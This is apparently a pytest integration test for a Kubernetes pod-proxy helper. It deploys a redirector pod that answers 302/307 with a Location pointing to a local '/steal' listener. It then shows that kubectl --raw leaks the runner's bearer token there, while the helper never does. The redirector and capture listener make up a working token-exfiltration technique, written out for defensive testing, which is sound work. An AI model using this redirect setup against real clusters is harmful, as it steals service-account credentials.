"""S17 against a real API server (`RW_TEST_KIND=1`, skipped otherwise): a pod that answers
302 with an absolute Location on a listener this test controls. `kubectl get --raw` through the
pod proxy follows it and sends the runner's bearer token there; `proxy_get` never contacts it.
The same pod answers a PUT, POST, PATCH or DELETE with a 307 to that listener (the write
methods of `proxy_request`), echoes a request body and headers back, and sits behind a service
whose port is named `http-artifactory` (16 characters, a valid DNS label).

Needs kubectl and a kind cluster (the current context of $KUBECONFIG, or `RW_TEST_KIND_CONTEXT`)
that can pull or already has the pod image (`python:3.12-alpine`, or `RW_TEST_KIND_IMAGE`). It
creates one namespace (`rw-s17-<random>`) with two service accounts and a pod, and deletes the
namespace afterwards. The runner's credential is a service-account token, because
client-certificate kubeconfigs do not leak to plain http.
"""

from __future__ import annotations

import json
import os
import secrets
import subprocess
import threading
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from pathlib import Path

import pytest

from runwhen_capability.k8s_proxy import proxy_get, proxy_request
from runwhen_capability.rwerrors import RwError

pytestmark = pytest.mark.skipif(
    os.environ.get("RW_TEST_KIND") != "1", reason="set RW_TEST_KIND=1 to run against kind"
)

IMAGE = os.environ.get("RW_TEST_KIND_IMAGE", "python:3.12-alpine")

REDIRECTOR = """\
import http.server, json, os
class H(http.server.BaseHTTPRequestHandler):
    def log_message(self, *a): pass
    def write(self):
        data = self.rfile.read(int(self.headers.get("Content-Length") or 0))
        if self.path.startswith("/echo"):
            body = json.dumps({"method": self.command, "body": data.decode(),
                               "content_type": self.headers.get("Content-Type"),
                               "accept": self.headers.get("Accept")}).encode()
            self.send_response(200)
        else:
            body = b""
            self.send_response(302 if self.path.startswith("/found") else 307)
            self.send_header("Location", os.environ["LOCATION"])
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)
    do_PUT = do_POST = do_PATCH = do_DELETE = write
    def do_GET(self):
        if self.path.startswith("/ok"):
            body = b"hello from the pod"
            self.send_response(200)
        elif self.path.startswith("/echo"):
            body = json.dumps({"accept": self.headers.get("Accept")}).encode()
            self.send_response(200)
        elif self.path.startswith("/relative"):
            body = b""
            self.send_response(302)
            self.send_header("Location", "/somewhere/else")
        else:
            body = b""
            self.send_response(302)
            self.send_header("Location", os.environ["LOCATION"])
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        if self.command != "HEAD":
            self.wfile.write(body)
    do_HEAD = do_GET
http.server.HTTPServer(("0.0.0.0", 8080), H).serve_forever()
"""


def kubectl(*args: str, kubeconfig: str | None = None, check: bool = True):
    env = {**os.environ}
    if kubeconfig:
        env["KUBECONFIG"] = kubeconfig
    done = subprocess.run(
        ["kubectl", *args], capture_output=True, text=True, env=env, check=False, timeout=180
    )
    if check and done.returncode != 0:
        raise AssertionError(f"kubectl {' '.join(args)}: {done.stderr}")
    return done


class Listener:
    """The 'other host': records the path and Authorization header of every request."""

    def __init__(self) -> None:
        self.seen: list[dict] = []
        seen = self.seen

        class Handler(BaseHTTPRequestHandler):
            def log_message(self, *args):
                pass

            def do_GET(self):
                seen.append(
                    {
                        "method": self.command,
                        "path": self.path,
                        "authorization": self.headers.get("Authorization"),
                    }
                )
                self.send_response(200)
                self.send_header("Content-Length", "0")
                self.end_headers()

            do_PUT = do_POST = do_PATCH = do_DELETE = do_HEAD = do_GET

        self.server = ThreadingHTTPServer(("127.0.0.1", 0), Handler)
        self.port = self.server.server_address[1]
        threading.Thread(target=self.server.serve_forever, daemon=True).start()

    def close(self) -> None:
        self.server.shutdown()
        self.server.server_close()


def kubeconfig_for(tmp: Path, name: str, token: str) -> str:
    """A kubeconfig for the current cluster that authenticates with `token` only."""
    cluster = json.loads(kubectl("config", "view", "--minify", "--flatten", "-o", "json").stdout)
    path = tmp / f"{name}.kubeconfig"
    doc = {
        "apiVersion": "v1",
        "kind": "Config",
        "clusters": cluster["clusters"],
        "users": [{"name": name, "user": {"token": token}}],
        "contexts": [
            {"name": name, "context": {"cluster": cluster["clusters"][0]["name"], "user": name}}
        ],
        "current-context": name,
    }
    path.write_text(json.dumps(doc))
    return str(path)


@pytest.fixture(scope="module")
def cluster(tmp_path_factory):
    tmp = tmp_path_factory.mktemp("kind")
    context = os.environ.get("RW_TEST_KIND_CONTEXT")
    if context:
        kubectl("config", "use-context", context)
    namespace = f"rw-s17-{secrets.token_hex(3)}"
    listener = Listener()
    kubectl("create", "namespace", namespace)
    try:
        for account in ("runner", "noperm"):
            kubectl("-n", namespace, "create", "serviceaccount", account)
        kubectl(
            "-n", namespace, "create", "role", "prober",
            "--verb=get,create,update,patch,delete", "--resource=pods/proxy,services/proxy",
        )  # fmt: skip
        kubectl(
            "-n", namespace, "create", "rolebinding", "prober",
            "--role=prober", f"--serviceaccount={namespace}:runner",
        )  # fmt: skip
        kubectl(
            "-n", namespace, "run", "redirector", f"--image={IMAGE}",
            "--image-pull-policy=IfNotPresent", "--port=8080",
            f"--env=LOCATION=http://127.0.0.1:{listener.port}/steal",
            "--command", "--", "python", "-c", REDIRECTOR,
        )  # fmt: skip
        kubectl(
            "-n", namespace, "wait", "--for=condition=Ready", "pod/redirector", "--timeout=150s"
        )
        service = {
            "apiVersion": "v1",
            "kind": "Service",
            "metadata": {"name": "web"},
            "spec": {
                "selector": {"run": "redirector"},
                "ports": [{"name": "http-artifactory", "port": 80, "targetPort": 8080}],
            },
        }
        (tmp / "service.json").write_text(json.dumps(service))
        kubectl("-n", namespace, "apply", "-f", str(tmp / "service.json"))
        runner = kubectl("-n", namespace, "create", "token", "runner").stdout.strip()
        noperm = kubectl("-n", namespace, "create", "token", "noperm").stdout.strip()
        yield {
            "namespace": namespace,
            "listener": listener,
            "runner_token": runner,
            "runner": kubeconfig_for(tmp, "runner", runner),
            "noperm": kubeconfig_for(tmp, "noperm", noperm),
        }
    finally:
        listener.close()
        kubectl("delete", "namespace", namespace, "--wait=false", check=False)


def test_kubectl_get_raw_follows_the_redirect_and_leaks_the_token(cluster):
    """The finding: the control. If this fails, the premise changed (report it)."""
    listener = cluster["listener"]
    before = len(listener.seen)
    kubectl(
        "get", "--raw",
        f"/api/v1/namespaces/{cluster['namespace']}/pods/redirector:8080/proxy/login",
        kubeconfig=cluster["runner"], check=False,
    )  # fmt: skip
    leaked = listener.seen[before:]
    assert leaked, "kubectl did not follow the redirect"
    assert leaked[0]["path"] == "/steal"
    assert leaked[0]["authorization"] == f"Bearer {cluster['runner_token']}"


def test_proxy_get_reports_the_redirect_and_never_contacts_the_other_host(cluster, monkeypatch):
    listener = cluster["listener"]
    monkeypatch.setenv("KUBECONFIG", cluster["runner"])
    before = len(listener.seen)
    got = proxy_get(cluster["namespace"], "pods", "redirector", 8080, "/login", timeout=60)
    assert got.status == 302
    assert got.location is None
    assert got.headers["x-rw-redirect-dropped"] == f"127.0.0.1:{listener.port}"
    assert "location" not in got.headers
    assert listener.seen[before:] == []


def test_proxy_get_returns_a_normal_answer_and_a_relative_redirect(cluster, monkeypatch):
    monkeypatch.setenv("KUBECONFIG", cluster["runner"])
    ok = proxy_get(cluster["namespace"], "pods", "redirector", 8080, "/ok", timeout=60)
    assert (ok.status, ok.body) == (200, b"hello from the pod")
    relative = proxy_get(cluster["namespace"], "pods", "redirector", "8080", "relative", timeout=60)
    # the API server rewrites a backend-relative Location into its own path space; the helper
    # strips that prefix again
    assert (relative.status, relative.location) == (302, "/somewhere/else")
    assert relative.headers["location"].endswith("/proxy/somewhere/else")
    # the location goes straight back in as a path (the pod redirects it to the other host)
    again = proxy_get(cluster["namespace"], "pods", "redirector", 8080, relative.location)
    assert (again.status, again.location) == (302, None)


def test_an_api_server_refusal_is_permission_denied(cluster, monkeypatch):
    monkeypatch.setenv("KUBECONFIG", cluster["noperm"])
    with pytest.raises(RwError) as raised:
        proxy_get(cluster["namespace"], "pods", "redirector", 8080, "/ok", timeout=60)
    assert raised.value.code == "permission_denied"


def test_a_missing_pod_is_not_found(cluster, monkeypatch):
    monkeypatch.setenv("KUBECONFIG", cluster["runner"])
    with pytest.raises(RwError) as raised:
        proxy_get(cluster["namespace"], "pods", "no-such-pod", 8080, "/ok", timeout=60)
    assert raised.value.code == "not_found"


def test_a_port_nobody_listens_on_is_unreachable(cluster, monkeypatch):
    monkeypatch.setenv("KUBECONFIG", cluster["runner"])
    with pytest.raises(RwError) as raised:
        proxy_get(cluster["namespace"], "pods", "redirector", 9999, "/ok", timeout=60)
    assert raised.value.code == "unreachable"


def test_no_proxy_directory_or_process_is_left_behind(cluster, monkeypatch):
    import glob
    import tempfile

    monkeypatch.setenv("KUBECONFIG", cluster["runner"])
    before = set(glob.glob(os.path.join(tempfile.gettempdir(), "rwk-*")))
    proxy_get(cluster["namespace"], "pods", "redirector", 8080, "/ok", timeout=60)
    assert set(glob.glob(os.path.join(tempfile.gettempdir(), "rwk-*"))) == before
    left = subprocess.run(["pgrep", "-f", "kubectl proxy --unix-socket"], capture_output=True)
    assert left.returncode == 1  # nothing matches


# -- write methods ---------------------------------------------------------------------------


@pytest.mark.parametrize("method", ["PUT", "POST", "PATCH", "DELETE"])
def test_proxy_request_never_follows_a_307_on_a_write(cluster, monkeypatch, method):
    listener = cluster["listener"]
    monkeypatch.setenv("KUBECONFIG", cluster["runner"])
    before = len(listener.seen)
    got = proxy_request(
        method,
        cluster["namespace"],
        "pods",
        "redirector",
        8080,
        "/login",
        body="payload",
        timeout=60,
    )
    assert got.status == 307
    assert got.location is None
    assert got.headers["x-rw-redirect-dropped"] == f"127.0.0.1:{listener.port}"
    assert listener.seen[before:] == []


@pytest.mark.parametrize("method", ["PUT", "POST", "PATCH", "DELETE"])
def test_a_request_body_and_headers_round_trip_through_the_real_proxy(cluster, monkeypatch, method):
    monkeypatch.setenv("KUBECONFIG", cluster["runner"])
    body = '{"id": "caf\u00e9", "n": 1}'
    got = proxy_request(
        method,
        cluster["namespace"],
        "pods",
        "redirector",
        8080,
        "/echo",
        body=body,
        headers={"Content-Type": "application/json", "Accept": "application/json"},
        timeout=60,
    )
    assert got.status == 200
    assert json.loads(got.body) == {
        "method": method,
        "body": body,
        "content_type": "application/json",
        "accept": "application/json",
    }


def test_a_get_header_and_a_head_through_the_real_proxy(cluster, monkeypatch):
    monkeypatch.setenv("KUBECONFIG", cluster["runner"])
    namespace = cluster["namespace"]
    got = proxy_get(
        namespace, "pods", "redirector", 8080, "/echo", headers={"Accept": "application/json"}
    )
    assert json.loads(got.body) == {"accept": "application/json"}
    head = proxy_request("HEAD", namespace, "pods", "redirector", 8080, "/ok", timeout=60)
    assert (head.status, head.body) == (200, b"")
    assert head.headers["content-length"] == str(len(b"hello from the pod"))


def test_a_service_port_name_of_16_characters_works(cluster, monkeypatch):
    monkeypatch.setenv("KUBECONFIG", cluster["runner"])
    for port in ("http-artifactory", 80):
        got = proxy_get(cluster["namespace"], "services", "web", port, "/ok", timeout=60)
        assert (got.status, got.body) == (200, b"hello from the pod"), port


def test_kubectl_raw_writes_leak_the_token_on_a_redirect_too(cluster, tmp_path):
    """The control for the write methods (observed with kubectl 1.36): `replace`, `create` and
    `delete --raw` all follow a 302 and re-send the bearer token, as a GET; `delete --raw`
    follows a 307 as a DELETE too, `replace`/`create --raw` stop at a 307. If this fails the
    claim in CONTRACTS.md has to change."""
    listener = cluster["listener"]
    base = f"/api/v1/namespaces/{cluster['namespace']}/pods/redirector:8080/proxy"
    payload = tmp_path / "payload.json"
    payload.write_text("{}")
    leaked = {}
    for status, tail in ((307, "login"), (302, "found")):
        for verb, extra in (
            ("replace", ["-f", str(payload)]),
            ("create", ["-f", str(payload)]),
            ("delete", []),
        ):
            before = len(listener.seen)
            kubectl(
                verb, "--raw", f"{base}/{tail}", *extra, kubeconfig=cluster["runner"], check=False
            )
            leaked[f"{verb} {status}"] = [
                (hit["method"], hit["authorization"] == f"Bearer {cluster['runner_token']}")
                for hit in listener.seen[before:]
            ]
    print("kubectl --raw redirect observations:", leaked)
    for verb in ("replace", "create", "delete"):
        assert leaked[f"{verb} 302"] == [("GET", True)], leaked
    assert leaked["delete 307"] == [("DELETE", True)], leaked
    # whatever kubectl does, the helper contacts nobody
    for method in ("PUT", "POST", "DELETE"):
        before = len(listener.seen)
        got = proxy_request(
            method, cluster["namespace"], "pods", "redirector", 8080, "/found", timeout=60
        )
        assert got.status == 302 and listener.seen[before:] == []
